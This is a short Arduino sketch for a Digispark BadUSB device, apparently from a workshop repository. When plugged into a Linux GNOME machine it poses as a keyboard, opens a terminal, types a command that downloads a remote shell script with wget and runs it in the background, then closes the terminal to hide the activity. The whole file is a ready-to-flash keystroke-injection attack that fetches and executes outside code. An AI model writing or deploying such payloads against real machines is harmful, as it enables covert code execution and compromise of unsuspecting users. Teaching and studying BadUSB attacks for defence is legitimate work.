#include "DigiKeyboard.h"
#include <avr/pgmspace.h>

void setup() {
  // put your setup code here, to run once:
  DigiKeyboard.update();
}

void loop() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("gnome-terminal"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(300);
  DigiKeyboard.println(F("(wget https://raw.githubusercontent.com/whoismath/BadUSB_Workshop/master/Payloads/payload-linux.sh && sh payload-linux.sh) &"));
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  while(1) {}
}
